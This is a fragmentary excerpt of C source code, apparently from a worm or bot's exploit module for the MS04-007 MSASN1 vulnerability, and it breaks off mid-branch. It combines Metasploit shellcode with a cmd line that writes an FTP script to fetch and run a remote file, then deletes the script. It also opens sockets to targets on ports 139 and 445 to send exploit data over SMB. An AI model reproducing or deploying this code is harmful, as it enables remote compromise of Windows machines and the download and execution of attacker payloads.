...
void MS04_007_MSASN1_PortedByScriptGod( exparam_s exparam )
{
	...
	int nCmdLen = _snprintf( ShellBuff + sizeof( MetasploitShellCode ) - 1, sizeof( ShellBuff ),
		...
		"cmd /k echo open %s %d > o&echo user %s %s >> o &echo get %s >> o &echo quit >> o &ftp -n -s:o &del /F /Q o &%s\r\n",
	...
	while( nCount < 2 && !bOK )
	{
		...
		if( nFDSocket != SOCKET_ERROR )
		{
			...
			SockAddr.sin_port				= htons( exparam.port );
			SockAddr.sin_addr.S_un.S_addr 	= exparam.ip;
			if( fconnect( nFDSocket, (sockaddr*)&SockAddr, sizeof( SockAddr ) ) != SOCKET_ERROR )
			{
				// send exploit data
				//if( exparam.port == 80 )
					//bOK = ExploitHTTP( nFDSocket, BitToken, exparam.ip );
				 if( exparam.port == 139 )
					bOK = ExploitSMBNT( nFDSocket, BitToken );
				else if( exparam.port == 445 )
